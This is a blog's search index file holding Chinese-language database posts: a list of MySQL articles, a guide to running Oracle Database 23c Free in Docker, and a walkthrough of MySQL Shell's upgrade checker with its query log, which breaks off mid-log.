<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【合集】2023 &amp; 2024 年 MySQL 文章清单</title>
    <url>/2024/mysql/mysql-articles-23-24/</url>
    <content><![CDATA[<blockquote>
<p>If You Want To Go Fast, Go Alone.</p>
<p>If You Want To Go Far, Go With Others.</p>
</blockquote>
<p>整理 2023 &amp; 2024 年发布的 MySQL 文章，按主题分类整理如下。</p>
<h2 id="MySQL-8-x">MySQL 8.x</h2>
<ol>
<li>2023-11-08, <a href="https://shawnyan.cn/2023/mysql/mysql-8.2.0-compile-customization/">【MySQL 8.x】定制化 MySQL 8.2.0 编译选项（文末彩蛋）</a></li>
<li>2023-10-31, <a href="https://shawnyan.cn/2023/mysql/mysql-8.2.0-compile-on-rocky-9/">【MySQL 8.x】在 Rocky 9 上编译 MySQL 8.2.0 Debug 版本编译指南</a></li>
<li>2023-10-27, <a href="https://shawnyan.cn/2023/mysql/mysql-8.2.0-sys-vars/">【MySQL 8.x】从参数变化解读 MySQL 8.2.0 发版说明</a></li>
<li>2023-07-18, <a href="https://shawnyan.cn/2023/mysql/mysql-8.1.0-release/">【MySQL 8.x】重磅！MySQL 8.1.0 已来！有彩蛋~</a></li>
</ol>
<h2 id="MySQL-Cloud">MySQL Cloud</h2>
<ol>
<li>2023-06-18, <a href="https://shawnyan.cn/2023/mysql/mysql-heatwave-1/">MySQL HeatWave 窥探（1）</a></li>
</ol>
<h2 id="管理运维-Maintain">管理运维 (Maintain)</h2>
<ol>
<li>2024-03-21, <a href="https://shawnyan.cn/2024/mysql/mysql-upgrade-mysql-shell-check/">MySQL 升级：MySQL Shell 檢查升級</a></li>
<li>2024-03-19, <a href="https://shawnyan.cn/2024/mysql/mysql-upgrade-change-2023-2/">MySQL 升级：MySQL Server 变更详解 (8.0.34 ~ 8.0.35)</a></li>
<li>2024-03-17, <a href="https://shawnyan.cn/2024/mysql/mysql-upgrade-change-2023-1/">MySQL 升级：MySQL Server 变更详解 (8.0.32 ~ 8.0.33)</a></li>
<li>2024-03-15, <a href="https://shawnyan.cn/2024/mysql/mysql-upgrade-deprecated/">MySQL 升级：使用 mysql_upgrade 注意事项（再见 mysql_upgrade）</a></li>
<li>2023-06-11, <a href="https://shawnyan.cn/2023/mysql/mysql-8-component_validate_password/">MySQL 管理运维：root 密码还可以这样改</a></li>
<li>2023-05-21, <a href="https://shawnyan.cn/2023/mysql/mysql-8.0.20-values-deprecated/">MySQL 管理运维：这类 VALUES() 已被弃用</a></li>
<li>2023-05-08, <a href="https://shawnyan.cn/2023/mysql/mysql-8-case-datetime-default/">MySQL 管理运维：妙用 DATETIME 数据类型的默认值</a></li>
<li>2023-04-30, <a href="https://shawnyan.cn/2023/mysql/mysql-8-case-drop-column/">MySQL 管理运维：删除列导致索引变化</a></li>
</ol>
<h2 id="故障分析-Troubleshoot">故障分析 (Troubleshoot)</h2>
<ol>
<li>2023-07-25, <a href="https://shawnyan.cn/2023/mysql/mysql-8.0.26-bug-crash/">再遇 MySQL “一招必杀” Bug</a></li>
</ol>
<h2 id="应用开发-Develop">应用开发 (Develop)</h2>
<ol>
<li>2024-02-29, <a href="https://shawnyan.cn/2024/mysql/mysql-connector-j-8-x/">如何选择适合的 MySQL Connector/J 版本</a></li>
<li>2024-03-19, <a href="https://shawnyan.cn/2023/mysql/mysql-tool-sql-developer/">MySQL 必备工具：SQL Developer</a></li>
</ol>
<h2 id="MySQL-认证-Certification">MySQL 认证 (Certification)</h2>
<ol>
<li>2024-03-17, <a href="https://shawnyan.cn/2023/mysql/mysql-certification-intro/">MySQL 数据库认证考试介绍（2024 版）</a></li>
</ol>
<h2 id="开源分支-Fork">开源分支 Fork</h2>
<ol>
<li>2024-02-05, <a href="https://shawnyan.cn/2024/mysql/greatsql-ap-rapid/">抢鲜体验 GreatSQL 的 AP 引擎 Rapid</a></li>
</ol>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<p>如果这篇文章为你带来了灵感或启发，就帮忙点『赞』or『在看』or『转发』吧，这对我非常重要，感谢！(๑˃̵ᴗ˂̵)</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mysql 5.7</tag>
        <tag>mysql 8.0</tag>
        <tag>linux</tag>
        <tag>mysql 8.x</tag>
        <tag>ocp</tag>
      </tags>
  </entry>
  <entry>
    <title>安装和使用 Oracle Database 23c 容器鏡像</title>
    <url>/2024/oracle/oracle-23c-free-container/</url>
    <content><![CDATA[<p>Oracle Database 23c 是 Oracle 最新的数据库版本，它带来了许多新特性和性能改进。</p>
<img  alt="23c.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240326-f6c1d476-4fae-4698-8f7f-62b2507c610e.png"
                      referrerpolicy="no-referrer"
                >
<p>对于开发者来说，Oracle 提供了一个免费的开发者版，</p>
<p>可以通过 Docker 容器轻松安装和使用。以下是详细的安装和使用指南。</p>
<ol>
<li>安装 Docker</li>
</ol>
<p>在开始之前，请确保你的系统上已经安装了 Docker。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~ 00:06:02]$ docker --version</span><br><span class="line">Docker version 26.0.0, build 2ae903e</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>拉取 Oracle 23c 免费开发者版镜像</li>
</ol>
<p>打开终端，使用以下命令从 Oracle 容器注册中心拉取最新的 Oracle 23c 免费开发者版镜像：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~ 00:20:45]$ docker pull container-registry.oracle.com/database/free:latest</span><br><span class="line">latest: Pulling from database/free</span><br><span class="line">089fdfcd47b7: Pull complete </span><br><span class="line">43c899d88edc: Pull complete </span><br><span class="line">47aa6f1886a1: Pull complete </span><br><span class="line">f8d07bb55995: Downloading [=============================&gt;                     ]  1.262GB/2.167GB</span><br><span class="line">c31c8c658c1e: Download complete </span><br><span class="line">b7d28faa08b4: Download complete </span><br><span class="line">1d0d5c628f6f: Download complete </span><br><span class="line">db82a695dad3: Download complete </span><br><span class="line">25a185515793: Download complete </span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>注意:</p>
<p>需要確保本地磁盤空間足夠，至少需要 9 G 空間。</p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Filesystem               Size  Used Avail Use% Mounted on</span><br><span class="line"># before</span><br><span class="line">/dev/mapper/centos-root   67G  9.2G   58G  14% /</span><br><span class="line"># after</span><br><span class="line">/dev/mapper/centos-root   67G   18G   50G  27% /</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>启动 Oracle 23c 容器</li>
</ol>
<p>使用以下命令启动 Oracle 23c 容器：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name ora23c -h shawnyan \</span><br><span class="line">  -p 1521:1521 \</span><br><span class="line">  container-registry.oracle.com/database/free:latest</span><br></pre></td></tr></table></figure></div>
<p>參數含義：</p>
<ul>
<li>-d 表示在后台运行容器。</li>
<li>–name 为容器指定一个名称。</li>
<li>-h 设置容器的主机名。</li>
<li>-p 将容器内部的端口映射到宿主机的端口（Oracle 默认的数据库端口是 1521）。</li>
</ul>
<ol start="4">
<li>查看容器狀態</li>
</ol>
<p>啓動容器后，查看容器狀態：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~ 00:29:16]$ docker ps</span><br><span class="line">CONTAINER ID   IMAGE                                                COMMAND                  CREATED         STATUS                            PORTS                                       NAMES</span><br><span class="line">d50083dd7cdd   container-registry.oracle.com/database/free:latest   &quot;/bin/bash -c $ORACL…&quot;   5 seconds ago   Up 4 seconds (health: starting)   0.0.0.0:1521-&gt;1521/tcp, :::1521-&gt;1521/tcp   ora23c</span><br></pre></td></tr></table></figure></div>
<p>可以通过运行以下命令来查看容器的启动日志：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~ 00:30:40]$ docker logs -f ora23c</span><br><span class="line">Starting Oracle Net Listener.</span><br><span class="line">Oracle Net Listener started.</span><br><span class="line">Starting Oracle Database instance FREE.</span><br><span class="line">Oracle Database instance FREE started.</span><br><span class="line"></span><br><span class="line">The Oracle base remains unchanged with value /opt/oracle</span><br><span class="line">#########################</span><br><span class="line">DATABASE IS READY TO USE!</span><br><span class="line">#########################</span><br><span class="line">The following output is now a tail of the alert.log:</span><br><span class="line">QPI: opatch file present, opatch</span><br><span class="line"> : </span><br><span class="line">QPI: qopiprep.bat file present</span><br><span class="line">2024-03-25T16:29:41.791016+00:00</span><br><span class="line">PDB$SEED(2):Opening pdb with Resource Manager plan: DEFAULT_PLAN</span><br><span class="line">FREEPDB1(3):Autotune of undo retention is turned on. </span><br><span class="line">2024-03-25T16:29:42.972403+00:00</span><br><span class="line">FREEPDB1(3):Opening pdb with Resource Manager plan: DEFAULT_PLAN</span><br><span class="line">Completed: Pluggable database FREEPDB1 opened read write </span><br><span class="line">Completed: ALTER DATABASE OPEN</span><br><span class="line">2024-03-25T16:29:45.388545+00:00</span><br><span class="line">===========================================================</span><br><span class="line">Dumping current patch information</span><br><span class="line">===========================================================</span><br><span class="line">No patches have been applied</span><br><span class="line">===========================================================</span><br><span class="line">2024-03-25T16:30:23.457562+00:00</span><br><span class="line">FREEPDB1(3):Resize operation completed for file# 13, fname /opt/oracle/oradata/FREE/FREEPDB1/sysaux01.dbf, old size 317440K, new size 327680K</span><br><span class="line">2024-03-25T16:30:23.484128+00:00</span><br><span class="line">FREEPDB1(3):Resize operation completed for file# 13, fname /opt/oracle/oradata/FREE/FREEPDB1/sysaux01.dbf, old size 327680K, new size 337920K</span><br></pre></td></tr></table></figure></div>
<ol start="5">
<li>設定密碼</li>
</ol>
<p>使用 <code>setPassword.sh</code> 脚本，對賬戶密碼進行修改。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~ 00:35:07]$ docker exec -it ora23c ./setPassword.sh 1</span><br><span class="line">The Oracle base remains unchanged with value /opt/oracle</span><br><span class="line"></span><br><span class="line">SQL*Plus: Release 23.0.0.0.0 - Production on Mon Mar 25 16:35:16 2024</span><br><span class="line">Version 23.3.0.23.09</span><br><span class="line"></span><br><span class="line">Copyright (c) 1982, 2023, Oracle.  All rights reserved.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Connected to:</span><br><span class="line">Oracle Database 23c Free Release 23.0.0.0.0 - Develop, Learn, and Run for Free</span><br><span class="line">Version 23.3.0.23.09</span><br><span class="line"></span><br><span class="line">SQL&gt; </span><br><span class="line">User altered.</span><br><span class="line"></span><br><span class="line">SQL&gt; </span><br><span class="line">User altered.</span><br><span class="line"></span><br><span class="line">SQL&gt; </span><br><span class="line">Session altered.</span><br><span class="line"></span><br><span class="line">SQL&gt; </span><br><span class="line">User altered.</span><br><span class="line"></span><br><span class="line">SQL&gt; Disconnected from Oracle Database 23c Free Release 23.0.0.0.0 - Develop, Learn, and Run for Free</span><br><span class="line">Version 23.3.0.23.09</span><br></pre></td></tr></table></figure></div>
<ol start="6">
<li>连接到数据库</li>
</ol>
<p>可以使用 SQL*Plus 工具连接到数据库。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~ 00:35:16]$ docker exec -it ora23c sqlplus sys@localhost:1521/FREE as sysdba</span><br><span class="line"></span><br><span class="line">SQL*Plus: Release 23.0.0.0.0 - Production on Mon Mar 25 16:37:13 2024</span><br><span class="line">Version 23.3.0.23.09</span><br><span class="line"></span><br><span class="line">Copyright (c) 1982, 2023, Oracle.  All rights reserved.</span><br><span class="line"></span><br><span class="line">Enter password: </span><br><span class="line"></span><br><span class="line">Connected to:</span><br><span class="line">Oracle Database 23c Free Release 23.0.0.0.0 - Develop, Learn, and Run for Free</span><br><span class="line">Version 23.3.0.23.09</span><br><span class="line"></span><br><span class="line">SQL&gt; show pdbs;</span><br><span class="line"></span><br><span class="line">    CON_ID CON_NAME			  OPEN MODE  RESTRICTED</span><br><span class="line">---------- ------------------------------ ---------- ----------</span><br><span class="line">	 2 PDB$SEED			  READ ONLY  NO</span><br><span class="line">	 3 FREEPDB1			  READ WRITE NO</span><br><span class="line">SQL&gt;       </span><br></pre></td></tr></table></figure></div>
<p>可以看到已經連接成功，Oracle 數據庫版本號為 23.3.0，默認創建了讀寫 PDB: FREEPDB1</p>
<ol start="7">
<li>數據庫開發</li>
</ol>
<p>在啓動容器時，已將數據庫端口映射到宿主機上，監聽 1521 端口。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~ 00:28:17]$ ss -antpl | grep 1521</span><br><span class="line">LISTEN     0      128          *:1521                     *:*                   users:((&quot;docker-proxy&quot;,pid=2716,fd=4))</span><br><span class="line">LISTEN     0      128       [::]:1521                  [::]:*                   users:((&quot;docker-proxy&quot;,pid=2722,fd=4))</span><br></pre></td></tr></table></figure></div>
<p>所以，可以使用 Oracle SQL Developer 連接 Oracle。</p>
<img  alt="sqldev23cconn.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240326-97b2c5c4-73fc-4a7d-bd1c-9a5f343d1224.png"
                      referrerpolicy="no-referrer"
                >
<p>連接成功后，查看數據庫版本信息。</p>
<img  alt="sqldev23c.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240326-aaeba652-dfaa-40de-b1f9-b99927ecdf1c.png"
                      referrerpolicy="no-referrer"
                >
<ol start="8">
<li>新特性驗證</li>
</ol>
<p>這裏簡單驗證兩個新功能：</p>
<p>(1) 不带 FROM 子句的 SELECT 查询</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL&gt; select 1;</span><br><span class="line"></span><br><span class="line">	 1</span><br><span class="line">----------</span><br><span class="line">	 1</span><br><span class="line"></span><br><span class="line">SQL&gt; select sysdate;</span><br><span class="line"></span><br><span class="line">SYSDATE</span><br><span class="line">---------</span><br><span class="line">25-MAR-24</span><br></pre></td></tr></table></figure></div>
<p>(2) DDL 支持 IF EXISTS 判断</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL&gt; create table if not exists t (id int);</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">SQL&gt; desc t;</span><br><span class="line"> Name					   Null?    Type</span><br><span class="line"> ----------------------------------------- -------- ----------------------------</span><br><span class="line"> ID						    NUMBER(38)</span><br></pre></td></tr></table></figure></div>
<p>簡單做個小結，</p>
<p>通過以上步驟，你可以轻松地在 Docker 環境中安裝和使用 Oracle Database 23c Free。</p>
<p>這爲開發者提供了一個便捷的平臺來學習和測試 Oracle 數據庫的新特性。</p>
<p>如果你在使用過程中遇到任何問題，可以參閲 Oracle 官方文檔，或尋求 Developer Community 支持。</p>
<p>– END. –</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<p>如果这篇文章为你带来了灵感或启发，就帮忙点『赞』or『在看』or『转发』吧，这对我非常重要，感谢！(๑˃̵ᴗ˂̵)</p>
]]></content>
      <categories>
        <category>Oracle</category>
        <category>23c</category>
      </categories>
      <tags>
        <tag>oracle</tag>
        <tag>oracle 23c</tag>
        <tag>container</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 升级：MySQL Shell 檢查升級</title>
    <url>/2024/mysql/mysql-upgrade-mysql-shell-check/</url>
    <content><![CDATA[<p>MySQL Shell 是一個功能強大的命令行界面，用於管理 MySQL 服務和進行各種操作。</p>
<p>其中一個有用的功能是它的升級檢查器（upgrade checker），它幫助用戶檢查當前 MySQL 服務實例與新版本之間的兼容性問題，從而減輕升級過程中的負擔。</p>
<p>以下是使用 MySQL Shell 檢查 MySQL 升級的一般步驟：</p>
<ol>
<li>
<p>安裝 MySQL Shell：首先，確保你的系統上安裝了 MySQL Shell。</p>
</li>
<li>
<p>如果尚未安裝，你可以從 MySQL 官方網站下載並安裝適合你操作系統的版本。</p>
</li>
</ol>
<p>本文以安裝 mysql-shell 8.0.36 爲例。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~ 12:19:23]$ yum install mysql-shell-8.0.36-1.el7.x86_64.rpm </span><br><span class="line">Loaded plugins: fastestmirror, langpacks</span><br><span class="line">Examining mysql-shell-8.0.36-1.el7.x86_64.rpm: mysql-shell-8.0.36-1.el7.x86_64</span><br><span class="line">Marking mysql-shell-8.0.36-1.el7.x86_64.rpm to be installed</span><br><span class="line">Resolving Dependencies</span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Running transaction check</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-shell.x86_64 0:8.0.36-1.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Finished Dependency Resolution</span></span><br><span class="line"></span><br><span class="line">Dependencies Resolved</span><br><span class="line"></span><br><span class="line">=======================================================================================</span><br><span class="line"> Package                                   Arch                         Version        </span><br><span class="line">=======================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> mysql-shell                               x86_64                       8.0.36-1.el7   </span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">=======================================================================================</span><br><span class="line">Install  1 Package</span><br><span class="line"></span><br><span class="line">Total size: 253 M</span><br><span class="line">Installed size: 253 M</span><br><span class="line">Is this ok [y/d/N]: y</span><br><span class="line">Downloading packages:</span><br><span class="line">Running transaction check</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded</span><br><span class="line">Running transaction</span><br><span class="line">  Installing : mysql-shell-8.0.36-1.el7.x86_64                                                                                       </span><br><span class="line">  Verifying  : mysql-shell-8.0.36-1.el7.x86_64                                                                                       </span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  mysql-shell.x86_64 0:8.0.36-1.el7                                                                                                  </span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>打開 MySQL Shell：在你的命令行或終端中，啟動 MySQL Shell，可以看到輸出版本號為 8.0.36。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~ 12:19:52]$ mysqlsh</span><br><span class="line">MySQL Shell 8.0.36</span><br><span class="line"></span><br><span class="line">Copyright (c) 2016, 2023, Oracle and/or its affiliates.</span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its affiliates.</span><br><span class="line">Other names may be trademarks of their respective owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;\help&#x27; or &#x27;\?&#x27; for help; &#x27;\quit&#x27; to exit.</span><br><span class="line"> MySQL  JS &gt; \q</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>連接到 MySQL 服務：使用 mysqlsh 命令連接到你的 MySQL 服務實例。</li>
</ol>
<p>例如：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~ 12:20:52]$ mysqlsh --mysql -uroot -h localhost --py</span><br><span class="line">Please provide the password for &#x27;root@localhost&#x27;: **********</span><br><span class="line">Save password for &#x27;root@localhost&#x27;? [Y]es/[N]o/Ne[v]er (default No): Y</span><br><span class="line">MySQL Shell 8.0.36</span><br><span class="line"></span><br><span class="line">Copyright (c) 2016, 2023, Oracle and/or its affiliates.</span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its affiliates.</span><br><span class="line">Other names may be trademarks of their respective owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;\help&#x27; or &#x27;\?&#x27; for help; &#x27;\quit&#x27; to exit.</span><br><span class="line">Creating a Classic session to &#x27;root@localhost&#x27;</span><br><span class="line">Fetching schema names for auto-completion... Press ^C to stop.</span><br><span class="line">Your MySQL connection id is 12</span><br><span class="line">Server version: 8.0.35 MySQL Community Server - GPL</span><br><span class="line">No default schema selected; type \use &lt;schema&gt; to set one.</span><br><span class="line"> MySQL  localhost  Py &gt; \s</span><br><span class="line">MySQL Shell version 8.0.36</span><br><span class="line"></span><br><span class="line">Connection Id:                12</span><br><span class="line">Current schema:               </span><br><span class="line">Current user:                 root@localhost</span><br><span class="line">SSL:                          Not in use.</span><br><span class="line">Using delimiter:              ;</span><br><span class="line">Server version:               8.0.35 MySQL Community Server - GPL</span><br><span class="line">Protocol version:             Classic 10</span><br><span class="line">Client library:               8.0.36</span><br><span class="line">Connection:                   Localhost via UNIX socket</span><br><span class="line">Unix socket:                  /var/lib/mysql/mysql.sock</span><br><span class="line">Server characterset:          utf8mb4</span><br><span class="line">Schema characterset:          utf8mb4</span><br><span class="line">Client characterset:          utf8mb4</span><br><span class="line">Conn. characterset:           utf8mb4</span><br><span class="line">Result characterset:          utf8mb4</span><br><span class="line">Compression:                  Disabled</span><br><span class="line">Uptime:                       18 hours 4 min 24.0000 sec</span><br><span class="line"></span><br><span class="line">Threads: 3  Questions: 27  Slow queries: 0  Opens: 152  Flush tables: 3  Open tables: 68  Queries per second avg: 0.000</span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>使用升級檢查工具：</li>
</ol>
<p>在 MySQL Shell 中，你可以使用 util.checkForServerUpgrade() 函數來檢查升級兼容性。</p>
<p>這個函數會返回一個報告，列出可能影響升級的問題，包括配置文件中的系統變量、已過時的功能、默認值更改等。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"> MySQL  localhost  JS &gt; util.checkForServerUpgrade();</span><br><span class="line">The MySQL server at /var%2Flib%2Fmysql%2Fmysql.sock, version 8.0.35 - MySQL</span><br><span class="line">Community Server - GPL, will now be checked for compatibility issues for</span><br><span class="line">upgrade to MySQL 8.0.36...</span><br><span class="line"></span><br><span class="line">1) Issues reported by &#x27;check table x for upgrade&#x27; command</span><br><span class="line">  No issues found</span><br><span class="line"></span><br><span class="line">Errors:   0</span><br><span class="line">Warnings: 0</span><br><span class="line">Notices:  0</span><br><span class="line"></span><br><span class="line">No known compatibility errors or issues were found.</span><br></pre></td></tr></table></figure></div>
<p>可以看到，當前 MySQL 服務器的版本為 8.0.35，升級到 8.0.36 沒有任何問題。</p>
<p>這期間，通過 general log 可以看到 mysql shell 執行了如下查詢。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-21T04:54:14.645245Z	   18 Connect	root@localhost on  using Socket</span><br><span class="line">2024-03-21T04:54:14.647414Z	   18 Query	SELECT CURRENT_USER()</span><br><span class="line">2024-03-21T04:54:14.648546Z	   18 Query	SELECT PRIVILEGE_TYPE FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE GRANTEE=&#x27;\&#x27;root\&#x27;@\&#x27;localhost\&#x27;&#x27; LIMIT 1</span><br><span class="line">2024-03-21T04:54:14.649930Z	   18 Query	SHOW PRIVILEGES</span><br><span class="line">2024-03-21T04:54:14.650531Z	   18 Query	show GLOBAL variables where `variable_name` in (&#x27;activate_all_roles_on_login&#x27;)</span><br><span class="line">2024-03-21T04:54:14.655569Z	   18 Query	SELECT default_role_user, default_role_host FROM mysql.default_roles WHERE user=&#x27;root&#x27; AND host=&#x27;localhost&#x27;</span><br><span class="line">2024-03-21T04:54:14.658020Z	   18 Query	show GLOBAL variables where `variable_name` in (&#x27;partial_revokes&#x27;)</span><br><span class="line">2024-03-21T04:54:14.659533Z	   18 Query	SHOW GRANTS FOR &#x27;root&#x27;@&#x27;localhost&#x27;</span><br><span class="line">2024-03-21T04:54:14.659955Z	   18 Query	select @@version, @@version_comment, UPPER(@@version_compile_os)</span><br><span class="line">2024-03-21T04:54:14.660269Z	   18 Query	USE mysql</span><br><span class="line">2024-03-21T04:54:14.660535Z	   18 Query	SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA not in (&#x27;information_schema&#x27;, &#x27;performance_schema&#x27;, &#x27;sys&#x27;)</span><br><span class="line">2024-03-21T04:54:14.664652Z	   18 Query	CHECK TABLE `mysql`.`columns_priv` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.665860Z	   18 Query	CHECK TABLE `mysql`.`component` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.666866Z	   18 Query	CHECK TABLE `mysql`.`db` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.667809Z	   18 Query	CHECK TABLE `mysql`.`default_roles` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.668556Z	   18 Query	CHECK TABLE `mysql`.`engine_cost` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.669643Z	   18 Query	CHECK TABLE `mysql`.`func` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.670143Z	   18 Query	CHECK TABLE `mysql`.`general_log` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.670547Z	   18 Query	CHECK TABLE `mysql`.`global_grants` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.670895Z	   18 Query	CHECK TABLE `mysql`.`gtid_executed` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.671253Z	   18 Query	CHECK TABLE `mysql`.`help_category` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.671537Z	   18 Query	CHECK TABLE `mysql`.`help_keyword` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.671873Z	   18 Query	CHECK TABLE `mysql`.`help_relation` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.672134Z	   18 Query	CHECK TABLE `mysql`.`help_topic` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.672421Z	   18 Query	CHECK TABLE `mysql`.`innodb_index_stats` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.672829Z	   18 Query	CHECK TABLE `mysql`.`innodb_table_stats` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.673244Z	   18 Query	CHECK TABLE `mysql`.`ndb_binlog_index` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.674656Z	   18 Query	CHECK TABLE `mysql`.`password_history` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.675465Z	   18 Query	CHECK TABLE `mysql`.`plugin` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.676176Z	   18 Query	CHECK TABLE `mysql`.`procs_priv` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.676949Z	   18 Query	CHECK TABLE `mysql`.`proxies_priv` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.677612Z	   18 Query	CHECK TABLE `mysql`.`replication_asynchronous_connection_failover` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.678347Z	   18 Query	CHECK TABLE `mysql`.`replication_asynchronous_connection_failover_managed` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.679068Z	   18 Query	CHECK TABLE `mysql`.`replication_group_configuration_version` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.679673Z	   18 Query	CHECK TABLE `mysql`.`replication_group_member_actions` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.680428Z	   18 Query	CHECK TABLE `mysql`.`role_edges` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.681366Z	   18 Query	CHECK TABLE `mysql`.`server_cost` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.682284Z	   18 Query	CHECK TABLE `mysql`.`servers` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.683046Z	   18 Query	CHECK TABLE `mysql`.`slave_master_info` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.683939Z	   18 Query	CHECK TABLE `mysql`.`slave_relay_log_info` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.684783Z	   18 Query	CHECK TABLE `mysql`.`slave_worker_info` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.685483Z	   18 Query	CHECK TABLE `mysql`.`slow_log` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.686066Z	   18 Query	CHECK TABLE `mysql`.`tables_priv` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.686688Z	   18 Query	CHECK TABLE `mysql`.`time_zone` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.687357Z	   18 Query	CHECK TABLE `mysql`.`time_zone_leap_second` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.688046Z	   18 Query	CHECK TABLE `mysql`.`time_zone_name` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.688604Z	   18 Query	CHECK TABLE `mysql`.`time_zone_transition` FOR 